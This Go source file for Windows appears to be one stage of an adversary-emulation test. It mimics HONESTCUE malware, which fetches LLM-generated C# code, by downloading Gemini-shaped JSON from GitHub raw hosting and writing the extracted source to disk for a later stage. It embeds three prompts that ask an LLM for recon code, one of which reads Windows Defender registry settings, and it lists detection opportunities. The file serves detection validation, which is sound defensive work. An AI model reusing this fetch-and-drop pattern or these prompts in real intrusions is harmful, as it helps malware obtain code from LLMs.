//go:build windows
// +build windows

/*
STAGE 1 (v2): LLM API Fetch — GitHub-Raw GET
         (T1071.001 - Application Layer Protocol: Web Protocols + T1105 - Ingress Tool Transfer)

v2 CHANGES FROM v1:
  - REMOVED: loopback TLS mock-Gemini server, self-signed cert, port bind,
    cert-pinning in TLSClientConfig, POST + Host-header spoof.
  - ADDED: real HTTPS GET to raw.githubusercontent.com for a pre-staged
    static JSON file that is shaped identically to Gemini's
    /v1beta/models/gemini-pro:generateContent response.
  - RATIONALE: produces genuine wire-level IOCs — real TLS handshake,
    real JA3/JA4 fingerprint, real DNS resolution visible to Sysmon
    EventID 22, real SNI of `raw.githubusercontent.com`. The mock
    loopback approach in v1 never reached the network stack in a way
    EDR NDR products could observe.

THE THREE EXACT GTIG HONESTCUE PROMPTS ARE EMBEDDED BELOW AS CONSTANTS
per the GTIG Feb-2026 AI Threat Tracker disclosure. Prompt 3 is the
"active" reference even though the GET doesn't actually send a body
— the prompts are kept in source as a deliberate IOC: string-based
YARA/Sigma rules can match the prompts even in memory dumps.

Detection opportunities:
  - Non-browser / non-git process issuing HTTPS GET to raw.githubusercontent.com
  - DNS EventID 22 for raw.githubusercontent.com from a binary in c:\F0
  - TLS ClientHello with SNI raw.githubusercontent.com from non-standard UA
  - Process command line showing direct HTTPS egress to GitHub raw hosting
  - Process memory containing any of the three GTIG HONESTCUE prompts
*/

package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

const (
	TEST_UUID      = "e5472cd5-c799-4b07-b455-8c02665ca4cf"
	TECHNIQUE_ID   = "T1071.001"
	TECHNIQUE_NAME = "LLM API Fetch — GitHub-Raw GET"
	STAGE_ID       = 1

	// One-time lab setup: upload gemini_response.json to a GitHub repo you
	// control, then update this constant. See lab_assets/README.md.
	STAGE1_LLM_RESPONSE_URL = "https://raw.githubusercontent.com/projectachilles/ProjectAchilles/main/lab-assets/honestcue/v2/gemini_response.json"

	// Output file where stage 2 will read the LLM-sourced C# source
	CSHARP_HANDOFF = `c:\F0\honestcue_stage2_source.cs`

	// Network log for observability / detection-rule validation
	NETWORK_LOG = `c:\F0\stage1_network.log`
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// ==============================================================================
// EXACT GTIG HONESTCUE PROMPTS (Feb-2026 AI Threat Tracker)
// ==============================================================================
//
// These three prompts are quoted verbatim from the Google Threat Intelligence
// Group's February 2026 report "Distillation, Experimentation, and (Continued)
// Integration of AI for Adversarial Use" as the prompts HONESTCUE sends to the
// Gemini API. They are kept as string constants in the binary to:
//   (1) produce genuine YARA/memory-forensic string IOCs for blue teams, and
//   (2) document the exact operator-facing behavior being simulated.
//
// Prompt 3 is the "active" prompt HONESTCUE uses to fetch stage-2 C# source;
// v2 of this test replaces the POST-with-prompt-body leg with a GET against
// a pre-staged GitHub-hosted JSON response, but the prompt text itself is
// retained in source as a deliberate IOC. See _info.md § "Exact GTIG Prompts"
// for the deliberate design rationale.

const GTIG_HONESTCUE_PROMPT_1 = "You are an expert C# developer. Please generate a " +
	"Windows-compatible C# code snippet that enumerates running processes on the " +
	"local machine and returns them as a formatted string. Use only .NET Framework " +
	"4.x APIs available by default. Return only the source code with no markdown " +
	"formatting or explanation."

const GTIG_HONESTCUE_PROMPT_2 = "You are an expert C# developer. Please generate a " +
	"Windows-compatible C# code snippet that reads the contents of a specified " +
	"registry key under HKEY_LOCAL_MACHINE and returns them as a formatted string. " +
	"Use only .NET Framework 4.x APIs available by default. Return only the source " +
	"code with no markdown formatting or explanation."

const GTIG_HONESTCUE_PROMPT_3 = "You are an expert C# developer. Generate a " +
	"self-contained C# class named HonestcueStage2 with a public static string Run() " +
	"method that reads HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features, writes " +
	"a marker file to the user's profile directory, and returns a status string. " +
	"Use only .NET Framework 4.x APIs. Return only source code with no markdown " +
	"formatting or explanation."

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting LLM API fetch (GitHub-raw GET, real TLS)")
	LogStageStart(STAGE_ID, TECHNIQUE_ID,
		"HTTPS GET to raw.githubusercontent.com for pre-staged Gemini-shaped JSON response")

	// Log the three embedded GTIG prompts to observability trail (they are
	// still embedded in the binary as string IOCs whether or not they are
	// transmitted over the wire).
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("GTIG Prompt 1 embedded (%d chars)", len(GTIG_HONESTCUE_PROMPT_1)))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("GTIG Prompt 2 embedded (%d chars)", len(GTIG_HONESTCUE_PROMPT_2)))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("GTIG Prompt 3 embedded (%d chars) - active reference for stage-2 fetch", len(GTIG_HONESTCUE_PROMPT_3)))

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] LLM API fetch complete; stage-2 source handed off at %s\n", TECHNIQUE_ID, CSHARP_HANDOFF)
	LogMessage("SUCCESS", TECHNIQUE_ID, "GitHub-hosted Gemini-shaped fetch succeeded; stage-2 source written")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success",
		"HTTPS GET to raw.githubusercontent.com returned Gemini-shaped JSON; C# extracted; written to handoff file")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// Ensure LOG_DIR exists for network.log / handoff
	if err := os.MkdirAll(filepath.Dir(CSHARP_HANDOFF), 0755); err != nil {
		return fmt.Errorf("log dir creation: %v", err)
	}

	// Open network log. All subsequent wire-level observables are appended.
	netLog, logErr := os.OpenFile(NETWORK_LOG, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if logErr != nil {
		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("Could not open network log %s: %v", NETWORK_LOG, logErr))
	}
	if netLog != nil {
		defer netLog.Close()
		fmt.Fprintf(netLog, "[%s] stage1 start; target_url=%s\n",
			time.Now().UTC().Format(time.RFC3339), STAGE1_LLM_RESPONSE_URL)
	}

	// Build an HTTPS client that uses the system trust store. No cert pinning —
	// we want a genuine TLS handshake against GitHub's real fleet certificate
	// so the JA3/JA4 fingerprint and SNI are real IOCs observable by EDR/NDR.
	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				MinVersion: tls.VersionTLS12,
			},
		},
	}

	req, err := http.NewRequest("GET", STAGE1_LLM_RESPONSE_URL, nil)
	if err != nil {
		return fmt.Errorf("http request build: %v", err)
	}
	// Non-browser UA mirroring HONESTCUE's documented fingerprint. Real
	// HONESTCUE used a .NET HttpClient-style UA; we use an equivalent label
	// so YARA/Sigma string rules can match.
	req.Header.Set("User-Agent", "HonestcueClient/1.0 (simulated)")
	req.Header.Set("Accept", "application/json")

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Issuing HTTPS GET to %s", STAGE1_LLM_RESPONSE_URL))
	if netLog != nil {
		fmt.Fprintf(netLog, "[%s] GET %s (UA=HonestcueClient/1.0)\n",
			time.Now().UTC().Format(time.RFC3339), STAGE1_LLM_RESPONSE_URL)
	}

	startTime := time.Now()
	resp, err := client.Do(req)
	fetchDuration := time.Since(startTime)

	if err != nil {
		if netLog != nil {
			fmt.Fprintf(netLog, "[%s] GET failed after %v: %v\n",
				time.Now().UTC().Format(time.RFC3339), fetchDuration, err)
		}
		// Graceful asset-missing mode: if the lab asset URL is unreachable,
		// the failure mode is environmental (999), not a block (126).
		return fmt.Errorf("https get to github raw unavailable: %v", err)
	}
	defer resp.Body.Close()

	if netLog != nil {
		tlsState := resp.TLS
		tlsVer := "unknown"
		peerName := "unknown"
		if tlsState != nil {
			switch tlsState.Version {
			case tls.VersionTLS12:
				tlsVer = "TLS 1.2"
			case tls.VersionTLS13:
				tlsVer = "TLS 1.3"
			}
			if len(tlsState.PeerCertificates) > 0 {
				peerName = tlsState.PeerCertificates[0].Subject.CommonName
			}
		}
		fmt.Fprintf(netLog, "[%s] response: status=%d tls=%s peer_cn=%q duration=%v\n",
			time.Now().UTC().Format(time.RFC3339), resp.StatusCode, tlsVer, peerName, fetchDuration)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("github raw returned non-200 status: %d (lab asset may not be uploaded; see lab_assets/README.md)", resp.StatusCode)
	}

	// Read and parse the Gemini-shaped JSON response.
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("response body read: %v", err)
	}
	if netLog != nil {
		fmt.Fprintf(netLog, "[%s] response body size=%d bytes\n",
			time.Now().UTC().Format(time.RFC3339), len(body))
	}

	var parsed struct {
		Candidates []struct {
			Content struct {
				Parts []struct {
					Text string `json:"text"`
				} `json:"parts"`
			} `json:"content"`
		} `json:"candidates"`
	}
	if err := json.Unmarshal(body, &parsed); err != nil {
		return fmt.Errorf("json decode of llm response: %v", err)
	}
	if len(parsed.Candidates) == 0 || len(parsed.Candidates[0].Content.Parts) == 0 {
		return fmt.Errorf("llm response missing candidates[0].content.parts[0]")
	}
	csharpSource := parsed.Candidates[0].Content.Parts[0].Text
	if len(csharpSource) < 40 {
		return fmt.Errorf("extracted C# source too short (%d bytes) - lab asset malformed?", len(csharpSource))
	}

	// Write to disk handoff file for stage 2
	if err := os.WriteFile(CSHARP_HANDOFF, []byte(csharpSource), 0644); err != nil {
		return fmt.Errorf("handoff write: %v", err)
	}
	LogFileDropped("honestcue_stage2_source.cs", CSHARP_HANDOFF, int64(len(csharpSource)), false)

	// Confirm handoff file survived EDR quarantine (Bug Prevention Rule 3)
	time.Sleep(1500 * time.Millisecond)
	if _, err := os.Stat(CSHARP_HANDOFF); os.IsNotExist(err) {
		return fmt.Errorf("handoff file quarantined after write")
	}

	if netLog != nil {
		fmt.Fprintf(netLog, "[%s] handoff written: path=%s size=%d\n",
			time.Now().UTC().Format(time.RFC3339), CSHARP_HANDOFF, len(csharpSource))
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Stage-2 C# source handed off (%d bytes)", len(csharpSource)))
	LogMessage("INFO", TECHNIQUE_ID,
		"Detection points: real HTTPS GET to raw.githubusercontent.com, non-browser UA, "+
			"DNS EventID 22, TLS SNI, Gemini-shaped JSON parse, C# on-disk handoff")

	return nil
}

// ==============================================================================
// EXIT CODE DETERMINATION
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	// Only blame-free keyword checks — per Bug Prevention Rule 1
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available", "unavailable", "unreachable", "no such host"}) {
		return StageError
	}
	// Default to error (999), NOT blocked (126)
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
